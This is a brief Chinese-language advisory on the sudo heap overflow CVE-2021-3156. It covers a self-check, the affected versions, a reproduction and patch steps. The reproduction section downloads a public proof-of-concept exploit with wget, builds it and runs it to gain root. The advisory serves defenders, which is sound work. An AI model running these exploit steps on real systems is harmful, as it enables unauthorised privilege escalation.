# 漏洞概述

攻击者在**取得服务器基础权限的情况下**，可以利用sudo基于堆的缓冲区溢出漏洞，获得root权限。

用户可以使用如下方法进行自查：

以非root用户登录系统，并使用命令`sudoedit -s /`

- 如果响应一个以`sudoedit:`开头的报错，那么表明存在漏洞。

- 如果响应一个以`usage:`开头的报错，那么表明补丁已经生效。

### 影响版本

```plain
sudo: 1.8.2 - 1.8.31p2
sudo: 1.9.0 - 1.9.5p1
```
### 漏洞等级

高危

# 漏洞复现

在kali上进行测试：

```plain
wget https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich <target_number>
```
![](https://raw.githubusercontent.com/oxff644/little-bread/master/20210202185701.png?token=AOYIZI7JIWRET6CG4G6IHK3ADEYD4)

![](https://raw.githubusercontent.com/oxff644/little-bread/master/20210202185719.png?token=AOYIZI4KC7F7XLFMTVUVWSTADEYFC)



# 修复建议

1. 针对Ubuntu
```plain
wget https://www.sudo.ws/dist/sudo-1.9.5p2.tar.gz
```
2. centos下
```plain
sudo yum -y update sudo
```


